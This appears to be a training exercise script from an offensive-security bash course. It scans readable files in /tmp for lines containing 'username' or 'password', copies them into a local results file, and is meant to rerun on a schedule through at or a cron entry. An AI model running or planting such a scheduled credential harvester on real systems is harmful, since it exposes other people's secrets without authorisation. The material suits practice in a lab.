#!/usr/bin/env bash

# How to use:
# bash playground/exercises/run_collect_credentials_at_schedule.sh

# Schedule:
# at now + 2 minutes -f /home/kali/Projects/Black-Hat-Bash/playground/exercises/run_collect_credentials_at_schedule.sh
# crontab - */2 * * * * bash /home/kali/Projects/Black-Hat-Bash/playground/exercises/run_collect_credentials_at_schedule.sh

#Make sure to make script executable

TARGET_DIR="/tmp"
OUTPUT_DIR="/home/kali/Projects/Black-Hat-Bash/data"
OUTPUT_FILE="$OUTPUT_DIR/found_credentials.txt"

mkdir -p "$OUTPUT_DIR"
touch "$OUTPUT_FILE"
echo > "$OUTPUT_FILE"

while read -r filename; do
  if grep -q -e "username" -e "password" "$filename"; then
    (
      echo "[*] $filename";
      grep "username" "$filename";
      grep "password" "$filename";
    ) >> "$OUTPUT_FILE"
  fi
done < <(find "$TARGET_DIR" -type f -readable 2> /dev/null)
